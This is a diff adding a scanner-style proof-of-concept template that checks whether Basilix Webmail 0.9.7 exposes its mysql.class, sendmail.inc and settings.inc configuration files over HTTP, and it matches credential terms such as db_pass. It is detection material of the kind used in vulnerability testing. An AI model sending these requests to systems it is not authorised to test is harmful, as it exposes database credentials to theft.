@@ -1,0 +1,59 @@
+[info]
+author = "ave"
+description = "检测 Basilix Webmail 0.9.7 是否将 .class 和 .inc 配置文件存放在 Web 根目录下且未限制访问，远程攻击者可通过 HTTP 直接读取 mysql.class 等敏感文件获取 MySQL 数据库凭据"
+id = "POC-AVE-2001-0443"
+name = "Basilix Webmail 0.9.7 Incorrect File Permissions PoC"
+severity = "high"
+tags = ["ave-2001-0443"]
+vuln_id = [
+    "CVE-2001-1044",
+    "AVE-2001-0443",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/class/mysql.class"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "mysql_connect",
+    "password",
+    "username",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/inc/sendmail.inc"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "smtp",
+    "mail",
+    "settings",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/inc/settings.inc"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "db_host",
+    "db_user",
+    "db_pass",
+]
